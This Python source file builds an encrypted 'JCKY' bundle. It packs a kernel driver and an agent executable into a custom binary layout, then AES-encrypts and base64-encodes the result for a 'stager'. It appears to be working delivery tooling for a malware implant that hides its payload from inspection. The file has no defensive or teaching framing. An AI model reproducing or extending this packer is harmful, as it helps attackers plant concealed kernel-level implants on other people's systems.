"""JCKY bundle builder — packages driver.sys + jocky_agent.exe for the stager.

Bundle format (plaintext):
  [BundleHeader 16B][BundleEntry × 2 (13B each)][driver data][agent data]

Encrypted as: base64( AES-256-CBC( IV[16] || PKCS7-padded(plaintext) ) )

Requires: pip install pycryptodome
"""

from __future__ import annotations

import base64
import struct

TYPE_DRIVER = 0x01
TYPE_AGENT  = 0x04

_MAGIC       = b"JCKY"
_VERSION     = 0x01
_HEADER_SIZE = 16   # magic(4) + version(1) + num_files(1) + reserved(10)
_ENTRY_SIZE  = 13   # type(1) + size(4) + offset(8)  — little-endian


def build_bundle(driver_bytes: bytes, agent_bytes: bytes, aes_key: bytes) -> bytes:
    """Build and encrypt a JCKY bundle; returns the base64-encoded ciphertext."""
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad

    files = [(TYPE_DRIVER, driver_bytes), (TYPE_AGENT, agent_bytes)]
    num_files = len(files)

    header = _MAGIC + struct.pack("BB", _VERSION, num_files) + b"\x00" * 10

    table_size = num_files * _ENTRY_SIZE
    data_start = _HEADER_SIZE + table_size

    table = b""
    data  = b""
    offset = data_start
    for ftype, fdata in files:
        table += struct.pack("<BIQ", ftype, len(fdata), offset)
        data  += fdata
        offset += len(fdata)

    plaintext  = header + table + data
    iv         = get_random_bytes(16)
    cipher     = AES.new(aes_key, AES.MODE_CBC, iv)
    ciphertext = iv + cipher.encrypt(pad(plaintext, AES.block_size))
    return base64.b64encode(ciphertext)


def build_bundle_from_files(
    driver_path: str,
    agent_path: str,
    aes_key_hex: str,
) -> bytes:
    """Read driver and agent from disk, build and return the encrypted bundle bytes."""
    aes_key     = bytes.fromhex(aes_key_hex)
    driver_data = open(driver_path, "rb").read()
    agent_data  = open(agent_path,  "rb").read()
    return build_bundle(driver_data, agent_data, aes_key)
